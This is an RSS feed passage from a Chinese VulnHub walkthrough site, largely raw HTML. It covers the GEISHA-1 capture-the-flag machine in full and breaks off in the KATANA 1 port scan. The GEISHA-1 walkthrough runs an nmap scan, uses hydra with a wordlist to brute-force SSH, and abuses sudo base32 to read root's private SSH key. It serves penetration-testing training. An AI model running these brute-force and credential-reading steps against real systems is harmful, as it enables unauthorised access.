&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/484/11.webp" alt="11">&lt;/p>- https://www.vulnhub.cn/walkthrough/484/ - This is a customized copyright.</description></item><item><title>Vulnhub 481 GEISHA-1</title><link>https://www.vulnhub.cn/walkthrough/481/</link><pubDate>Wed, 13 May 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/481/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/481/ -&lt;p>考点：hydra,GTFOBins&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/geisha-1,481/">https://www.vulnhub.com/entry/geisha-1,481/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.24&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GEISHA-1&lt;/td>
&lt;td>10.0.2.36&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.36
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>21/tcp open ftp vsftpd 3.0.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 ((Debian))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Geisha
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: OPTIONS HEAD GET POST
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 (Debian)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7080/tcp open ssl/http LiteSpeed httpd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Geisha
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssl-cert: Subject: &lt;span style="color:#00688b">commonName&lt;/span>=geisha/organizationName=webadmin/countryName=US
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Issuer: &lt;span style="color:#00688b">commonName&lt;/span>=geisha/organizationName=webadmin/countryName=US
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key type: rsa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key bits: &lt;span style="color:#b452cd">2048&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Signature Algorithm: sha256WithRSAEncryption
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid before: 2020-05-09T14:01:34
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid after: 2022-05-09T14:01:34
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MD5: 6df2 adf3 &lt;span style="color:#b452cd">8254&lt;/span> f954 1f65 b502 0e94 &lt;span style="color:#b452cd">5985&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_SHA-1: bd05 448c fa9f 3d8a a040 &lt;span style="color:#b452cd">3396&lt;/span> &lt;span style="color:#b452cd">8676&lt;/span> c64d 0f96 &lt;span style="color:#b452cd">9993&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ssl-date: TLS randomness does not represent &lt;span style="color:#658b00">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: LiteSpeed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| tls-alpn:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| h2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| spdy/3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| spdy/2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ http/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7125/tcp open http nginx 1.17.10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Geisha
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx/1.17.10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8088/tcp open http LiteSpeed httpd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Geisha
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: LiteSpeed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>9198/tcp open http SimpleHTTPServer 0.6 (Python 2.7.16)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Geisha
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: SimpleHTTP/0.6 Python/2.7.16
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>端口21无有用信息&lt;/p>
&lt;h3 id="web测试">WEB测试&lt;/h3>
&lt;h4 id="端口80">端口80&lt;/h4>
&lt;p>无有用信息&lt;/p>
&lt;h4 id="端口7080">端口7080&lt;/h4>
&lt;p>无有用信息&lt;/p>
&lt;h4 id="端口7125">端口7125&lt;/h4>
&lt;p>&lt;code>dirb&lt;/code>一顿输出&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/481/1.webp" alt="1">&lt;/p>
&lt;p>下载 http://10.0.2.36:7125/passwd发现存在用户&lt;code>geisha&lt;/code>&lt;/p>
&lt;h4 id="端口8088">端口8088&lt;/h4>
&lt;p>无有用信息&lt;/p>
&lt;h4 id="端口9198">端口9198&lt;/h4>
&lt;p>无有用信息&lt;/p>
&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;p>根据上面得到的用户名，爆破下ssh&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hydra -l geisha -P /usr/share/wordlists/rockyou.txt -f 10.0.2.36 ssh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/481/2.webp" alt="2">&lt;/p>
&lt;p>爆破成功&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/481/3.webp" alt="3">&lt;/p>
&lt;p>&lt;a href="https://gtfobins.github.io/gtfobins/base32/">GTFOBins&lt;/a>走起&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/481/4.webp" alt="4">&lt;/p>
&lt;p>不能执行命令，但是可以root权限读取文件&lt;/p>
&lt;p>那就读取一下root ssh登录认证密钥吧&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/481/5.webp" alt="5">&lt;/p>
&lt;p>保存为id_rsa，修改权限，登录root用户&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/481/6.webp" alt="6">&lt;/p>- https://www.vulnhub.cn/walkthrough/481/ - This is a customized copyright.</description></item><item><title>Vulnhub 482 KATANA 1</title><link>https://www.vulnhub.cn/walkthrough/482/</link><pubDate>Wed, 13 May 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/482/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/482/ -&lt;p>考点：文件上传,cap_setuid+ep&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/katana-1,482/">https://www.vulnhub.com/entry/katana-1,482/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.24&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>KATANA: 1&lt;/td>
&lt;td>10.0.2.21&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.21
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -p- &lt;span style="color:#00688b">$rip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>21/tcp open ftp vsftpd 3.0.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 ((Debian))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 (Debian)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET POST OPTIONS HEAD
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Katana X
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7080/tcp open ssl/http LiteSpeed httpd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
